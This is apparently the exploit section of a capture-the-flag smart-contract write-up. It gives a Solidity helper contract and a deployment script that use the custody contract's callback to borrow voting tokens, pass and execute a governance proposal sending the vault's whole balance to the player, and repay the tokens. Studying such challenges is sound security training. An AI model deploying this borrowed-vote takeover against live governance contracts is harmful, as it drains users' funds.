# Exploit

The attacker deploys a helper contract implementing the custody callback interface.

```solidity id="jlwm95"
contract TakeoverHelper is ICustodyRecipient {
    CivicCouncil public council;
    CivicToken public token;
    CivicCustody public custody;
    address payable public player;

    constructor(
        CivicCouncil _council,
        CivicToken _token,
        CivicCustody _custody,
        address payable _player
    ) {
        council = _council;
        token = _token;
        custody = _custody;
        player = _player;
    }

    function attack() external {
        uint256 custodyBalance =
            token.balanceOf(address(custody));

        custody.checkout(custodyBalance);
    }

    function receiveCustody(uint256 amount)
        external
        override
    {
        uint256 vaultBalance =
            address(council.vault()).balance;

        uint256 proposalId =
            council.propose(player, vaultBalance);

        council.execute(proposalId);

        token.transfer(address(custody), amount);
    }

    receive() external payable {}
}
```

Exploit script:

```solidity id="jlwm96"
function run() external {
    vm.startBroadcast(PLAYER_PRIVATE_KEY);

    TakeoverHelper helper =
        new TakeoverHelper(
            civicCouncilInstance,
            civicCouncilInstance.token(),
            civicCouncilInstance.custody(),
            payable(PLAYER_ADDRESS)
        );

    helper.attack();

    vm.stopBroadcast();
}
```

